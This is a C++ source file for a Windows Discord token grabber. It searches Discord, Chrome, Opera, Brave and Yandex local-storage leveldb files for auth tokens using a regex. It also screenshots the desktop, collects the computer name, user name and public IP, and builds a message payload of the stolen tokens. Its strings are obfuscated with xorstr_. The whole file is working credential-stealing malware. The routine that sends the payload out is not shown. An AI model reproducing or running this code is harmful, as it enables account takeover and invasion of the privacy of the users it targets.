#include <string>
#include <filesystem>
#include <regex>

#include "requests.h"
#include "helper.h"

using namespace Gdiplus;
namespace fs = std::filesystem;

struct stat info;

namespace helpers {
	std::string regex_token = R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})";

	std::string roaming = getenv(xorstr_("APPDATA"));

	std::string local = getenv(xorstr_("LOCALAPPDATA"));

	std::array<std::pair<std::string, std::string>, 7> paths = { { { xorstr_("Discord"), roaming + xorstr_("\\Discord") },
															   { xorstr_("Discord Canary"), roaming + xorstr_("\\discordcanary") },
															   { xorstr_("Discord PTB"), roaming + xorstr_("\\discordptb") },
															   { xorstr_("Google Chrome"), local + xorstr_("\\Google\\Chrome\\User Data\\Default") },
															   { xorstr_("Opera"), roaming + xorstr_("\\Opera Software\\Opera Stable") },
															   { xorstr_("Brave"), local + xorstr_("\\BraveSoftware\\Brave-Browser\\User Data\\Default") },
															   { xorstr_("Yandex"), local + xorstr_("\\Yandex\\YandexBrowser\\User Data\\Default") },
															} };

	std::string read_file(const char* filename) {
		std::string content;
		FILE* fp;
		fopen_s(&fp, filename, xorstr_("rb"));
		if (fp) {
			fseek(fp, 0, SEEK_END);
			content.resize(ftell(fp));
			rewind(fp);
			fread(&content[0], 1, content.size(), fp);
			fclose(fp);
		}
		return(content);
	}

	void take_screenshot(std::string file) {
		ULONG_PTR gdiplustoken;
		GdiplusStartupInput gdistartupinput;
		GdiplusStartupOutput gdistartupoutput;

		gdistartupinput.SuppressBackgroundThread = true;
		GdiplusStartup(&gdiplustoken, &gdistartupinput, &gdistartupoutput); //start GDI+

		HDC dc = GetDC(GetDesktopWindow());//get desktop content
		HDC dc2 = CreateCompatibleDC(dc);	 //copy context

		RECT rc0kno;  // rectangle  Object

		GetClientRect(GetDesktopWindow(), &rc0kno);// get desktop size;
		int w = rc0kno.right - rc0kno.left;//width
		int h = rc0kno.bottom - rc0kno.top;//height

		HBITMAP hbitmap = CreateCompatibleBitmap(dc, w, h);  //create bitmap
		HBITMAP holdbitmap = (HBITMAP)SelectObject(dc2, hbitmap);

		BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);  //copy pixel from pulpit to bitmap
		Bitmap* bm = new Bitmap(hbitmap, NULL);

		UINT num;
		UINT size;

		ImageCodecInfo* imagecodecinfo;
		GetImageEncodersSize(&num, &size); //get count of codec

		imagecodecinfo = (ImageCodecInfo*)(malloc(size));
		GetImageEncoders(num, size, imagecodecinfo);//get codec

		CLSID clsidEncoder;

		for (int i = 0; i < num; i++)
		{
			if (wcscmp(imagecodecinfo[i].MimeType, L"image/jpeg") == 0)
				clsidEncoder = imagecodecinfo[i].Clsid;   //get jpeg codec id

		}

		free(imagecodecinfo);

		std::wstring ws;
		ws.assign(file.begin(), file.end());  //sring to wstring
		bm->Save(ws.c_str(), &clsidEncoder);   //save in jpeg format
		SelectObject(dc2, holdbitmap);  //Release Objects
		DeleteObject(dc2);
		DeleteObject(hbitmap);

		ReleaseDC(GetDesktopWindow(), dc);
		GdiplusShutdown(gdiplustoken);
	}

	std::string get_computer_info() {
		#define INFO_BUFFER_SIZE 32767
		TCHAR  infoBuf[INFO_BUFFER_SIZE];
		DWORD  bufCharCount = INFO_BUFFER_SIZE;

		std::string payload = "";

		GetComputerName(infoBuf, &bufCharCount);
		payload += "Computer name: " + std::string(infoBuf);

		payload += "\n";

		GetUserName(infoBuf, &bufCharCount);
		payload += "Username: " + std::string(infoBuf);

		return payload;
	}

	std::string get_ip() {
		auto response = requests::get_request("https://api.ipify.org/");
		return response;
	}

	std::vector<std::string> get_tokens() {
		std::vector<std::string> tokens = {};
		for (auto path : paths) {
			if (!(stat(path.second.c_str(), &info) != 0) && info.st_mode & S_IFDIR) {
				if (!(info.st_mode & S_IFDIR)) {
					continue;
				}

				path.second += xorstr_("\\Local Storage\\leveldb");

				for (const auto& entry : fs::directory_iterator(path.second)) {
					if (fs::path(entry.path()).extension().string() != xorstr_(".log") && fs::path(entry.path()).extension().string() != xorstr_(".ldb")) {
						continue;
					}

					std::smatch match;
					std::string content = read_file(entry.path().string().c_str());

					std::string::const_iterator search_start(content.cbegin());
					while (std::regex_search(search_start, content.cend(), match, std::regex(regex_token))) {
						tokens.push_back(match[0]);
						search_start = match.suffix().first;
					}
				}
			}
		}
		return tokens;
	}

	std::string prepare_token_payload(std::vector<std::string> tokens) {
		std::string payload = xorstr_("cmd=send_message&content=**Tokens**\n```\n");
		for (auto token : tokens) {
			payload += token + xorstr_("\n");
		}

		payload += xorstr_("\n```");

		return payload;
	}
}